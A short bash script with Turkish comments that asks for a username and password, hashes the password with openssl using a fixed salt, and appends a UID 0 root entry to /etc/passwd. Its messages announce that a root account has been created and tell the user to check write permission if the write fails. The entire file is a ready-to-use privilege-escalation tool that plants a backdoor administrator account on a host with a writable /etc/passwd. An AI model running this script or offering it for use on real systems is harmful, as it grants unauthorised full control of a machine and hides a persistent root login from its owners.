#!/bin/bash

#Kullanıcıdan input ister
read -p "Kullanıcı adı: " username
read -p "Parola: " parola

#Parolayı passwd formatına dönüştürür
ssl=$(openssl passwd -1 -salt ignite $parola)

#/etc/passwd syntax: username:SALT+HASH:0:0:root:/root:/bin/bash
echo $username':'$ssl':0:0:root:/root:/bin/bash' >> /etc/passwd
if [ $? -eq 0 ]; then
	echo "Root hesabınız oluşturuldu."
	echo "su "$username "ve "$parola "ile giriş yapabilirsiniz."
else
	echo "HATA:/etc/passwd'ye yazma izniniz olduğunu kontrol edin."
fi

